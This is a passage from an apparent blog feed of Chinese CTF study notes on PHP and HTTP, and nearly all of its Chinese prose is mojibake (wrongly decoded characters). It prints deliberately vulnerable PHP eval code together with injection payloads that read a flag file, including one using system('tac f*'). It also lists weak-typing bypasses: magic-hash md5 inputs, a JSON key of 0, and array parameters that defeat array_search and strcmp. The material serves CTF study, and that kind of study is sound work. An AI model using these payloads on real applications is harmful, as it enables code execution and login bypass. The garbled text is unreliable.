&#125;?&gt;</code></pre><p>//</p><pre><code>ä»¤ç‹å†²æ—å¹³ä¹‹æ›²æ´‹ä»»ç›ˆç›ˆå‘é—®å¤©ä»»æˆ‘è¡Œå†²è™šæ–¹æ­£å²³ä¸ç¾¤å®ä¸­åˆ™</code></pre><p>//</p><pre><code>&lt;?php$students = array(&#39;2010&#39;=&gt;&#39;ä»¤ç‹å†²&#39;,&#39;2011&#39;=&gt;&#39;æ—å¹³ä¹‹&#39;, &#39;2012&#39;=&gt;&#39;æ›²æ´‹&#39;,&#39;2013&#39;=&gt;&#39;ä»»ç›ˆç›ˆ&#39;,&#39;2014&#39;=&gt;&#39;å‘é—®å¤©&#39;,&#39;2015&#39;=&gt;&#39;ä»»æˆ‘è¡Œ&#39;,&#39;2016&#39;=&gt;&#39;å†²è™š&#39;,&#39;2017&#39;=&gt;&#39;æ–¹æ­£&#39;,&#39;2018&#39;=&gt;&#39;å²³ä¸ç¾¤&#39;,&#39;2019&#39;=&gt;&#39;å®ä¸­åˆ™&#39;, );//10ä¸ªå­¦ç”Ÿçš„å­¦å·å’Œå§“åï¼Œç”¨æ•°ç»„å­˜å‚¨//ä½¿ç”¨å¾ªç¯ç»“æ„éå†æ•°ç»„,è·å–å­¦å·å’Œå§“å  foreach($students as $key =&gt; $v)&#123; echo $key.&quot;:&quot;.$v;//è¾“å‡ºï¼ˆæ‰“å°ï¼‰å­¦å·ï¼šå§“åecho &quot;&lt;br /&gt;&quot;;&#125;?&gt;</code></pre><p>//</p><pre><code> 2010:ä»¤ç‹å†²2011:æ—å¹³ä¹‹2012:æ›²æ´‹2013:ä»»ç›ˆç›ˆ2014:å‘é—®å¤©2015:ä»»æˆ‘è¡Œ2016:å†²è™š2017:æ–¹æ­£2018:å²³ä¸ç¾¤2019:å®ä¸­åˆ™</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>httpã€knife</title>
      <link href="/2021/02/03/http/"/>
      <url>/2021/02/03/http/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>è¿™é“é¢˜ä¸éš¾ï¼Œå€’æ˜¯ï¼Œå› ä¸ºä¸€ç‚¹ç‚¹çš„è·‘åï¼Œæ‰“å¼€äº†ä¸åº”è¯¥æ‰“å¼€çš„ä¸œè¥¿ï¼Œå“ˆå“ˆå“ˆ</p><span id="more"></span><p>f12,æ‰“å¼€ç½‘é¡µï¼ŒbpæŠ“åŒ…ï¼Œæ”¹åŒ…</p><p>ç¬¬äºŒä¸ªï¼Œç›´æ¥ä¸Šèœåˆ€</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>httpå¤´</title>
      <link href="/2021/02/03/http%E5%A4%B4/"/>
      <url>/2021/02/03/http%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>httpåè®®ç®€ä»‹</p><span id="more"></span><h1>HTTP(HyperText Transfer Protocol,è¶…æ–‡æœ¬ä¼ è¾“åè®®)ï¼Œæ˜¯ä¸€ä¸ªåŸºäºè¯·æ±‚ä¸ç›¸åº”ï¼Œæ— çŠ¶æ€çš„ï¼Œåº”ç”¨çš„åè®®ï¼Œå¸¸è¿è¡Œåœ¨tcp/ipåè®®ä¼ è¾“æ•°æ®ã€‚<h1>1ã€HTTPæŠ¥æ–‡æ ¼å¼</h1>(1)httpè¯·æ±‚<p><img src="1.png"></p><p>ç¬¬ä¸€éƒ¨åˆ†ï¼š<br><br>è¯·æ±‚æ–¹å¼ |ç©ºæ ¼|è·¯å¾„|ç©ºæ ¼|åè®®ç‰ˆæœ¬ï¼ˆè¯·æ±‚è¡Œï¼‰<br><br>ç¬¬äºŒéƒ¨åˆ†ï¼š<br><br>å¤´éƒ¨å­—æ®µå|ï¼š|å€¼ï¼ˆè¯·æ±‚å¤´éƒ¨ï¼‰<br><br>ç©ºè¡Œï¼ˆä¸èƒ½ç¼ºå°‘ï¼‰<br><br>ç¬¬å››éƒ¨åˆ†ï¼š<br><br>è¯·æ±‚æ­£æ–‡ï¼ˆå›¾ä¸­æ²¡æœ‰ï¼Œä¸€èˆ¬åªæœ‰postæ–¹å¼æ‰æœ‰ï¼‰<br></p><h1>(2)ã€HTTPå“åº”</h1><p><img src="2.png"></p><p>ç¬¬ä¸€éƒ¨åˆ†ï¼š<br><br>åè®®ç‰ˆæœ¬|ç©ºæ ¼|çŠ¶æ€ç |çŠ¶æ€ç æè¿°|ï¼ˆçŠ¶æ€è¡Œï¼‰<br><br>ç¬¬äºŒéƒ¨åˆ†ï¼š<br><br>å¤´éƒ¨å­—æ®µå|ï¼š|å€¼|ï¼ˆå“åº”å¤´éƒ¨ï¼‰<br><br>ç¬¬ä¸‰éƒ¨åˆ†ï¼š<br><br>ç©ºè¡Œï¼ˆå¿…ä¸å¯å°‘ï¼‰<br><br>ç¬¬å››éƒ¨åˆ†ï¼š<br><br>å“åº”æ­£æ–‡<br></p><h1>3ã€å¸¸æœ‰çš„çŠ¶æ€ç </h1><pre><code> (1ï¼‰ã€200ï¼šæœåŠ¡å™¨å·²æˆåŠŸå¤„ç†äº†è¯·æ±‚å¹¶æä¾›äº†è¯·æ±‚çš„ç½‘é¡µã€‚ (2ï¼‰ã€204ï¼š æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†è¯·æ±‚ï¼Œä½†æ²¡æœ‰è¿”å›ä»»ä½•å†…å®¹ã€‚ (3ï¼‰ã€301ï¼š è¯·æ±‚çš„ç½‘é¡µå·²æ°¸ä¹…ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚å½“URLså‘ç”Ÿå˜åŒ–æ—¶ï¼Œä½¿ç”¨301ä»£ç ã€‚æœç´¢å¼•æ“ç´¢å¼•ä¸­ä¿å­˜æ–°çš„URLã€‚ï¼ˆ4ï¼‰ã€302ï¼š è¯·æ±‚çš„ç½‘é¡µä¸´æ—¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚æœç´¢å¼•æ“ç´¢å¼•ä¸­ä¿å­˜åŸæ¥çš„URLã€‚ï¼ˆ5ï¼‰ã€304ï¼š å¦‚æœç½‘é¡µè‡ªè¯·æ±‚è€…ä¸Šæ¬¡è¯·æ±‚åæ²¡æœ‰æ›´æ–°ï¼Œåˆ™ç”¨304ä»£ç å‘Š è¯‰æœç´¢å¼•æ“æœºå™¨äººï¼Œå¯èŠ‚çœå¸¦å®½å’Œå¼€é”€ã€‚ï¼ˆ6ï¼‰ã€400ï¼š æœåŠ¡å™¨ä¸ç†è§£è¯·æ±‚çš„è¯­æ³•ã€‚ï¼ˆ7ï¼‰ã€403ï¼š æœåŠ¡å™¨æ‹’ç»è¯·æ±‚ã€‚ï¼ˆ8ï¼‰ã€404ï¼š æœåŠ¡å™¨æ‰¾ä¸åˆ°è¯·æ±‚çš„ç½‘é¡µã€‚æœåŠ¡å™¨ä¸Šä¸å­˜åœ¨çš„ç½‘é¡µç»å¸¸ä¼šè¿”å›æ­¤ä»£ç ã€‚ï¼ˆ9ï¼‰ã€410 ï¼šè¯·æ±‚çš„èµ„æºæ°¸ä¹…åˆ é™¤åï¼ŒæœåŠ¡å™¨è¿”å›æ­¤å“åº”ã€‚è¯¥ä»£ç ä¸ 404ï¼ˆæœªæ‰¾åˆ°ï¼‰ä»£ç ç›¸ä¼¼ï¼Œä½†åœ¨èµ„æºä»¥å‰å­˜åœ¨è€Œç°åœ¨ä¸å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œæœ‰æ—¶ç”¨æ¥æ›¿ä»£404 ä»£ç ã€‚å¦‚æœèµ„æºå·²æ°¸ä¹…åˆ é™¤ï¼Œåº”å½“ä½¿ç”¨ 301 æŒ‡å®šèµ„æºçš„æ–°ä½ç½®ã€‚ï¼ˆ10ï¼‰ã€500 ï¼šæœåŠ¡å™¨é‡åˆ°é”™è¯¯ï¼Œæ— æ³•å®Œæˆè¯·æ±‚ã€‚ï¼ˆ11ï¼‰ã€503ï¼š æœåŠ¡å™¨ç›®å‰æ— æ³•ä½¿ç”¨ï¼ˆç”±äºè¶…è½½æˆ–åœæœºç»´æŠ¤ï¼‰ã€‚</code></pre><h1>4ã€ HTTPè¯·æ±‚æ–¹æ³•</h1>    1ã€OPTIONSï¼šè¿”å›æœåŠ¡å™¨é’ˆå¯¹ç‰¹å®šèµ„æºæ‰€æ”¯æŒçš„HTTPè¯·æ±‚æ–¹æ³•ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å‘webæœåŠ¡å™¨å‘é€â€˜*â€™çš„è¯·æ±‚æ¥æµ‹è¯•æœåŠ¡å™¨çš„åŠŸèƒ½æ€§    2ã€HEADï¼šå‘æœåŠ¡å™¨ç´¢ä¸GETè¯·æ±‚ç›¸ä¸€è‡´çš„å“åº”ï¼Œåªä¸è¿‡å“åº”ä½“å°†ä¸ä¼šè¢«è¿”å›ã€‚è¿™ä¸€æ–¹æ³•å¯ä»¥å†ä¸å¿…ä¼ è¾“æ•´ä¸ªå“åº”å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥è·å–åŒ…å«åœ¨å“åº”å°æ¶ˆæ¯å¤´ä¸­çš„å…ƒä¿¡æ¯ã€‚    3ã€GETï¼šå‘ç‰¹å®šçš„èµ„æºå‘å‡ºè¯·æ±‚ã€‚æ³¨æ„ï¼šGETæ–¹æ³•ä¸åº”å½“è¢«ç”¨äºäº§ç”Ÿâ€œå‰¯ä½œç”¨â€çš„æ“ä½œä¸­ï¼Œä¾‹å¦‚åœ¨Web Applicationä¸­ï¼Œå…¶ä¸­ä¸€ä¸ªåŸå› æ˜¯GETå¯èƒ½ä¼šè¢«ç½‘ç»œèœ˜è››ç­‰éšæ„è®¿é—®ã€‚Loadrunnerä¸­å¯¹åº”getè¯·æ±‚å‡½æ•°ï¼šweb_linkå’Œweb_url    4ã€POSTï¼šå‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POSTè¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„å»ºç«‹å’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚ Loadrunnerä¸­å¯¹åº”POSTè¯·æ±‚å‡½æ•°ï¼šweb_submit_data,web_submit_form    5ã€PUTï¼šå‘æŒ‡å®šèµ„æºä½ç½®ä¸Šä¼ å…¶æœ€æ–°å†…å®¹    6ã€DELETEï¼šè¯·æ±‚æœåŠ¡å™¨åˆ é™¤Request-URLæ‰€æ ‡è¯†çš„èµ„æº    7ã€TRACEï¼šå›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­    8ã€CONNECTï¼šHTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚æ³¨æ„ï¼šå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½¿ç”¨çš„æ˜¯GETå’ŒHEAD/POSTæ–¹æ³•ï¼Œå¹¶ä¸”è¿™äº›æ–¹æ³•åŒºåˆ†å¤§å°å†™ï¼Œå½“æŸä¸ªè¯·æ±‚çš„èµ„æºä¸æ”¯æŒå¯¹åº”çš„è¯·æ±‚æ–¹æ³•çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨åº”å½“è¿”å›çŠ¶æ€ç 405ï¼›å½“æœåŠ¡å™¨ä¸è®¤è¯†æˆ–è€…ä¸æ”¯æŒå¯¹åº”çš„è¯·æ±‚æ–¹æ³•æ—¶ï¼Œåº”è¿”å›çŠ¶æ€ç 501ã€‚<h1>5ã€HTTPå¤´éƒ¨å­—æ®µ</h1><pre><code>ï¼ˆ1ï¼‰ã€User-Agentï¼šå‘Šè¯‰ç½‘ç«™æœåŠ¡å™¨ï¼Œè®¿é—®è€…æ˜¯é€šè¿‡ä»€ä¹ˆå·¥å…·æ¥è¯·æ±‚çš„ï¼›ï¼ˆ2ï¼‰ã€X-Forwarded-For ï¼šç”¨æ¥è¡¨ç¤ºHTTPè¯·æ±‚ç«¯çœŸå®IPï¼›ï¼ˆ3ï¼‰ã€X-Forwarded-IPï¼šåŒX-Forwarded-Forï¼›ï¼ˆ4ï¼‰ã€Accept-Languageï¼šè®¾ç½®æ¥å—çš„è¯­è¨€ï¼› (5ï¼‰ã€Accept-Encodingï¼šæ˜¯æµè§ˆå™¨å‘ç»™æœåŠ¡å™¨ï¼Œå£°æ˜æµè§ˆå™¨æ”¯æŒçš„ç¼–ç ç±»å‹ï¼›ï¼ˆ6ï¼‰ã€Content-Type ç”¨äºè¡¨æ˜å‘é€æ•°æ®æµçš„ç±»å‹ï¼ŒæœåŠ¡å™¨æ ¹æ®ç¼–ç æœåŠ¡å™¨æ ¹æ®ç¼–ç ç±»å‹ä½¿ç”¨ç‰¹å®šçš„è§£ææ–¹å¼ï¼Œè·å–æ•°æ®æµä¸­çš„æ•°æ®ï¼›ï¼ˆ7ï¼‰ã€Cookieï¼šè¾¨è®¤ç”¨æˆ·çŠ¶æ€åŠèº«ä»½çš„ï¼›ï¼ˆ8ï¼‰ã€Referer ï¼šå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠReferer ï¼Œå‘Šè¯‰æœåŠ¡å™¨è¯¥ç½‘é¡µæ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ã€‚</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åŸºç¡€çŸ¥è¯†ç§¯ç´¯</title>
      <link href="/2021/02/03/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
      <url>/2021/02/03/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>ä¸€ã€bugkuæ–‡ä»¶åŒ…å«</p><pre><code>  &lt;?php include &quot;flag.php&quot;; $a = @$_REQUEST[&#39;hello&#39;]; eval( &quot;var_dump($a);&quot;); show_source(__FILE__); ?&gt;</code></pre><p>æˆ‘çŸ¥é“çš„è§£å°±æ˜¯systemï¼ˆâ€™tac f*â€™ï¼‰ï¼Œè¿˜æœ‰å°±æ˜¯file(â€œflag.phpâ€)<br>,ä½†çœ‹åˆ°äº†æœ‰äº›å¤§ä½¬å…¶ä»–çš„åšé¢˜æ–¹æ³•ï¼Œè®°å½•ä¸€ä¸‹ã€‚<br> åœ¨sqlæ³¨å…¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¸¸å¸¸ä½¿ç”¨â€™è¿›è¡Œé—­åˆï¼Œè¿™é‡Œé‡Œé¢æœ‰evalå‡½æ•°ï¼Œæ˜¯æ‰§è¡Œçš„ä»£ç æ®µï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ ?hello=1);print_r(flag.php//print_r() å‡½æ•°ç”¨äºæ‰“å°å˜é‡ï¼Œä»¥æ›´å®¹æ˜“ç†è§£çš„å½¢å¼å±•ç¤ºã€‚<br>ç»“æœæ˜¯intï¼ˆ1ï¼‰ï¼Œflag.php<br><br>å¤§ä½¬ä»¬æ„é€ çš„æ˜¯<mark>hello=);print_r(file(â€œ./flag.phpâ€));//</mark><br><br>evalå‡½æ•°ä¸­ï¼Œâ€â€œå†…éƒ¨ä¸ºä»£ç ï¼Œ//åªåœ¨ä»£ç ä¸­èµ·ä½œç”¨ï¼Œç›¸å½“äºåªæ³¨é‡Šäº†ï¼‰ï¼›<br><br>ç¬¬äºŒç‚¹ï¼Œfile_get_contentsä¸fileåŠvar_dump,print_rå’ŒechoåŒºåˆ«<br></p><pre><code> &lt;?php  include buu.php;  $a=file(&quot;buu.php&quot;);  print_r($a);?&gt;</code></pre><p>å¯ä»¥æˆåŠŸå›æ˜¾buu.phpçš„å†…å®¹ï¼ˆfile() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œä»¥æ•°ç»„çš„å½¢åŠ¿è¿”å›ã€‚ï¼‰</p><pre><code>      Array ( [0] =&gt; flag=&#123;1234&#125; ) </code></pre><p>ç”¨file_get_concentsæµ‹è¯•</p><pre><code>     flag=&#123;1234&#125;</code></pre><p>æ˜¯ç›´æ¥è¿”å›å†…å®¹</p><p>è¿™é“é¢˜ï¼Œç”¨file_get_concentsæ˜¯ä¸å¯ä»¥çš„ï¼Œå¯èƒ½æ˜¯å› ä¸ºå®ƒè¯»å–çš„æ˜¯å­—ç¬¦ä¸²ã€‚<br>     1ã€echo å¯ä»¥è¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸² ï¼Œå¤šä¸ªä»¥é€—å·éš”å¼€å°±è¡Œ</p><pre><code> 2ã€print ä¹Ÿå¯ä»¥è¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸² ï¼Œå¤šä¸ªè¦ç”¨è¿æ¥ç¬¦ 3ã€print_r()å¯ä»¥æ‰“å°æ•°ç»„ï¼›å¯¹è±¡</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpå¼±ç±»å‹</title>
      <link href="/2021/02/02/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
      <url>/2021/02/02/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>0x01å‰è¨€</h1>phpå¼±ç±»å‹æ˜¯æŒ‡ï¼Œåœ¨å¯¹phpçš„å˜é‡è¿›è¡Œåˆå§‹åŒ–çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸ç”¨å¯¹å…¶çš„å˜é‡è¿›è¡Œç±»å‹çš„å®šä¹‰ã€‚<h1>0x02çŸ¥è¯†ä»‹ç»</h1>phpæœ‰ä¸¤ç§æ¯”è¾ƒçš„ç¬¦å· == ä¸===<pre><code>&lt;?php$a==$b;$a===$b?&gt;</code></pre><p>===åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦çš„ç±»å‹æ˜¯å¦ç›¸åŒï¼Œåœ¨æ¯”è¾ƒï¼Œå€¼æ˜¯ä¸æ˜¯ç›¸åŒï¼Œå°±æ˜¯å…¨ç­‰ã€‚<br><br>==åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œåœ¨æ¯”è¾ƒã€‚<br></p><pre><code> å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²æ—¶ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æŒ‰ç…§æ•°å€¼æ¥æ¯”è¾ƒ</code></pre><h1>è¿™é‡Œæ˜ç¡®è¯´äº†å¦‚æœä¸€ä¸ªæ•°å€¼å’Œå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†å­—ç¬¦ä¸²è½¬åŒ–æˆæ•°å€¼</h1><pre><code> &lt;?php  var_dump(&#39;admin&#39;==0);//true var_dump(&#39;1admin&#39;==0);//true var_dump(&#39;admin1&#39;==1);//false var_dump(&#39;0e12345&#39;==&#39;0e23456&#39;);//true ?&gt;</code></pre><p>ç»“è®º</p><pre><code> 1.è§‚å¯Ÿä¸Šè¿°ä»£ç ï¼Œâ€˜adminâ€™==0 æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†adminè½¬åŒ–æˆæ•°å€¼ï¼Œå¼ºåˆ¶è½¬åŒ–ï¼Œç”±äºadminæ˜¯å­—ç¬¦ä¸²ï¼Œè½¬åŒ–ç»“æœæ˜¯0è‡ªç„¶å’Œ0ç›¸ç­‰ 2.â€˜1adminâ€™==1æ˜¯å¯¹çš„ï¼Œä½†æ˜¯â€˜admin1â€™==1æ˜¯é”™çš„ï¼Œç›¸åä»–ç­‰äº0ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ 3.â€˜0e123456â€™==â€˜0e2345â€™ç›¸äº’æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œ0çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯0ï¼Œæ‰€ä»¥ç›¸ç­‰ã€‚</code></pre><h1>å¯¹äºä¸Šè¿°é—®é¢˜ï¼ŒæŸ¥è¯¢phpæ‰‹å†Œ</h1><pre><code>å½“ä¸€ä¸ªå­—ç¬¦ä¸²å½“ä½œä¸€ä¸ªæ•°å€¼æ¥å–å€¼æ—¶ï¼Œå…¶ç»“æœå’Œç±»å‹å¦‚ä¸‹ï¼šå¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«â€˜.â€™,&#39;e&#39;,&#39;E&#39;å¹¶ä¸”å…¶æ•°å€¼åœ¨æ•´å‹çš„èŒƒå›´å†…ï¼Œè¯¥å­—ç¬¦ä¸²è¢«å½“ä½œæ•´å‹æ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µè¢«å½“ä½œfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶ä¸º0.</code></pre><p>ä¾‹å­</p><pre><code> &lt;?php  $t=1+&#39;10.5&#39;;//11.5  $t=1+&#39;-1.3e3&#39;;//-1299  $t=1+&quot;bob-1.3e3&quot;//1  $t=1+&quot;2admin&quot;;//3  $t=1+&quot;admin1&quot;;//1  ?&gt;</code></pre><h1>0x03 å®æˆ˜</h1><i>md5ç»•è¿‡ï¼ˆhashæ¯”è¾ƒç¼ºé™·ï¼‰</i><pre><code>&lt;?php if(isset($_GET[&#39;username&#39;])&amp;&amp;isset($_GET[&#39;password&#39;]))&#123;$logined=true; $usename=$_GET[&#39;usename&#39;]; $password=$_GET[&#39;password&#39;]; if(!ctype_alpha($usernmae))&#123;$logined=false;&#125; if(!is_numeric($password))&#123;$logined=false;&#125; if(md5($username)!=md5($password))&#123;$logined=false&#125; if($l)&#123; echo &quot;successful&quot;&#125;else echo&quot;false&quot;;&#125;?&gt;</code></pre><p>ç»•è¾“å…¥æ•°å­—å’Œå­—ç¬¦ä¸²ï¼Œä¸”md5å€¼ç›¸ç­‰ï¼Œå¦‚240610708å’ŒQNKCDZO</p><pre><code>    0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š    QNKCDZO    0e830400451993494058024219903391    240610708    0e462097431906509019562988736854    s878926199a    0e545993274517709034328855841020    s155964671a    0e342768416822451524974117254469    s214587387a    0e848240448830537924465865611904</code></pre><p>è¿™ä¹ˆå¤šå°±å¤Ÿç”¨äº†</p><h1>jsonç»•è¿‡</h1><pre><code>   &lt;?php   if(isset($_POST[&#39;message&#39;]))&#123;   $message=json_decode($_POST[&#39;message&#39;]);   $key=&quot;*********&quot;;   if($message-&gt;key==$key)&#123;   echo &quot;flag&quot;;              &#125;   else echo &quot;fail&quot;;   &#125;   else&#123;echo &quot;````&quot;;&#125;?&gt;//json_decodeæ˜¯å¯¹jsonå­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œä½¿å…¶å˜æˆphpå˜é‡ã€‚</code></pre><p>ä¸¾ä¾‹</p><pre><code> &lt;?php $json = &#39;&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;&#39;; var_dump(json_decode($json)); var_dump(json_decode($json, true)); ?&gt;</code></pre><p>ç»“æœ</p><pre><code> object(stdClass)#1 (5) &#123;[&quot;a&quot;] =&gt; int(1)[&quot;b&quot;] =&gt; int(2)[&quot;c&quot;] =&gt; int(3)[&quot;d&quot;] =&gt; int(4)[&quot;e&quot;] =&gt; int(5)&#125;array(5) &#123;[&quot;a&quot;] =&gt; int(1)[&quot;b&quot;] =&gt; int(2)[&quot;c&quot;] =&gt; int(3)[&quot;d&quot;] =&gt; int(4)[&quot;e&quot;] =&gt; int(5)&#125;</code></pre><p>è¾“å…¥ä¸€ä¸ªjsonç±»å‹çš„å­—ç¬¦ä¸²ï¼Œjson_decodeå‡½æ•°è§£å¯†æˆä¸€ä¸ªæ•°ç»„ï¼Œåˆ¤æ–­æ•°ç»„ä¸­keyçš„å€¼æ˜¯å¦ç­‰äº$keyçš„å€¼ï¼Œä½†æ˜¯keyçš„å€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œå¯ä»¥åˆ©ç”¨0==â€˜adminâ€™è¿›è¡Œç»•è¿‡ï¼Œæ„é€  message={â€œkeyâ€:0}</p><h1>array_search is_arrayç»•è¿‡</h1><pre><code>  &lt;?php   ifï¼ˆ!is_array($_GET[&#39;test&#39;])ï¼‰&#123;exit();&#125;   $test=$_GET[&#39;test&#39;];   for($i=0;$i&lt;count($test);$i++)&#123;      if($test[$i]===&quot;admin&quot;)&#123;        echo &quot;error&quot;;        exit();       &#125;    $test[$i]=intval($test[$i]);&#125;  if(array_search(&quot;admin&quot;,$test)===0)&#123;    echo &quot;flag&quot;;&#125;  else echo &quot;false&quot;;    ?&gt;</code></pre><p>array_search() å‡½æ•°åœ¨æ•°ç»„ä¸­æœç´¢æŸä¸ªé”®å€¼ï¼Œå¹¶è¿”å›å¯¹åº”çš„é”®åã€‚<br><br>å…ˆåˆ¤æ–­ä¼ å…¥çš„æ˜¯ä¸æ˜¯æ•°ç»„ï¼Œä¸æ˜¯é€€å‡ºï¼Œç„¶åéå†æ¯ä¸ªæ•°ç»„çš„å€¼ï¼Œå¹¶ä¸”æ¯ä¸ªæ•°ç»„çš„å€¼ä¸èƒ½å’Œadminç›¸ç­‰ï¼Œå¹¶ä¸”å°†æ¯ä¸ªå€¼è½¬åŒ–ä¸ºintç±»å‹ï¼Œåœ¨åˆ¤æ–­ä¼ å…¥çš„æ•°ç»„æ˜¯å¦æœ‰adminï¼Œæœ‰åˆ™è¿”å›flag<br></p><pre><code> test[]=0å¯ä»¥ç»•è¿‡</code></pre><p>ä¸‹é¢æ˜¯å¯¹arrayâ€”â€”searchçš„ä»‹ç»ã€‚</p><pre><code>mixed array_search(mixed $needle,array $haystack [, bool $strict=false])</code></pre><p>$needle,$haystackå¿…éœ€ï¼Œ$strictå¯é€‰ï¼Œå‡½æ•°åˆ¤æ–­$haystackä¸­å€¼æ˜¯å­˜åœ¨$needle,å­˜åœ¨åˆ™è¿”å›é”®å€¼ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°é»˜è®¤ä¸ºfalseï¼Œå¦‚æœè®¾ç½®ä¸º trueï¼Œåˆ™åœ¨æ•°ç»„ä¸­æ£€æŸ¥ç»™å®šå€¼çš„ç±»å‹ï¼Œæ¯”å¦‚åœ¨ä¸‹ä¸ªä¾‹å­ä¸­æ•°å­— 5 å’Œå­—ç¬¦ä¸² 5 æ˜¯ä¸åŒçš„ã€‚</p><pre><code>&lt;?php $a=array(&quot;a&quot;=&gt;&quot;5&quot;,&quot;b&quot;=&gt;5,&quot;c&quot;=&gt;&quot;5&quot;); echo array_search(5,$a,true); ?&gt;//è¾“å‡º b</code></pre><p>å…¶å®ä»–ç±»ä¼¼ä¸==</p><h1>strcmpæ¼æ´ç»•è¿‡(phpç‰ˆæœ¬åœ¨5.3ä»¥å)</h1><pre><code> &lt;?php $password=&quot;******&quot;; if(isset($_POST[&#39;password&#39;]))&#123; if(strcmp($_POST[&#39;password&#39;],$password)==0)&#123;  echo &quot;right!!!&quot;;exit();&#125;else &#123; echo&quot;wrong!&quot;;&#125;&#125;?&gt;</code></pre><p>strmpæ˜¯æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœstr1&lt;str2åˆ™è¿”å›&lt;0,åä¹‹å¤§äº0ï¼Œå¦‚æœç›¸ç­‰è¿”å›0.æˆ‘ä»¬ä¸çŸ¥é“ï¿¥passwordçš„å€¼ï¼Œé¢˜ç›®è¦æ±‚strcmpåˆ¤æ–­çš„æ¥å—çš„å€¼ä¸$passwordå¿…é¡»ç›¸ç­‰ï¼Œstrcmpä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²å‹ï¼Œå¦‚æœä¼ å…¥æ•°ç»„è¯¥æ€ä¹ˆæ ·ï¼Ÿ<br><br>æˆ‘ä»¬ä¼ å…¥password[]=12,ï¼Œæ˜¯å› 